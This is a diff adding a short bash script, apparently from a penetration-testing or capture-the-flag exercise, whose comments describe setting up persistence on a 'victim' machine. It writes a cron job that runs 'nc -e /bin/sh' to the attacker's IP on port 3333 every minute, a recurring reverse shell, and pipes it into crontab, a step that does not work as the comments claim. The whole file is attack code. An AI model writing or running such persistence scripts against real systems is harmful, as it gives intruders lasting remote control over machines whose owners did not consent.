@@ -1,0 +1,11 @@
+#!/bin/bash
+#first we have to make our terminal and the victims terminal compatible together
+#this will allow us to edit the file properly
+export TERM=xterm
+#Specify the command we want to run to maintain persistence; set it to a variable
+#this will run the command on the victim machine every minute
+#it connects to our ip on port 3333
+command="* * * * * nc -e /bin/sh 192.168.132.131 3333"
+#now we have to edit the cron tab file which default to using vi
+#we will echo the command into the crontab file
+echo $command | crontab -e
